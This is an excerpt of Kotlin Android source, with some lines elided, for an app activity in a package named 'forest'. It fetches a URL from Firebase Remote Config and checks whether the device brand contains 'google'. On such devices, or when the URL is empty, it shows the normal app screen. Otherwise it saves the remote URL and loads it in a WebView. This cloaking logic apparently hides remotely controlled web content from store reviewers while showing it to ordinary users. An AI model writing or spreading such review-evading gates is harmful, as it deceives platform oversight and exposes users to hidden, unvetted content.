...
import pl.bk20.forest.app.MainActivity
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import pl.bk20.forest.databinding.ActivityWebViewBinding
import java.io.File
...
class WebViewActivity : AppCompatActivity() {
    ...
    private lateinit var mainActivityBinding: ActivityWebViewBinding
    private lateinit var webView: WebView
    private lateinit var startUrl: String
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        mainActivityBinding = ActivityWebViewBinding.inflate(layoutInflater)
        webView = mainActivityBinding.webview
        val prefs = getSharedPreferences("fal", Context.MODE_PRIVATE)
        ...
        try {
            if (savedInstanceState != null)
                ...
                if (prefs.getString("fal", null) == null) {
                    remoteConfig.fetchAndActivate().addOnCompleteListener { task ->
                        if (task.isSuccessful) {
                            val boolTo = remoteConfig.getBoolean("to")
                            startUrl = remoteConfig.getString("fal")
                            val i = startUrl
                            if (!boolTo) {
                                if (startUrl == "" || Build.BRAND.contains("google")) {
                                    startActivity(
                                        Intent(this, MainActivity::class.java)
                                    )
                                    finish()
                                } else {
                                    prefs.edit().putString("fal", startUrl).apply()
                    ...
                    startUrl = prefs.getString("fal", null)!!
                    webView.loadUrl(startUrl)
                }
            }
        } catch (e: Exception) {
